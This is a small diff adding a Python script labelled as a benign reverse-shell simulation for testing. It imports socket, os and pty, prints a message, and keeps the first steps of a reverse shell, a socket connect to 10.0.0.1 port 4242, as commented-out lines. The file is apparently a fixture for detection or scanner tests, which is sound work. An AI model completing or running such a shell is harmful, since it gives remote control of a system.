@@ -1,0 +1,11 @@
+#!/usr/bin/env python3
+import socket
+import os
+import pty
+
+# Reverse shell simulation (benign for testing)
+def simulate():
+    print("Simulating reverse shell...")
+    # s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    # s.connect(("10.0.0.1",4242))
+simulate()
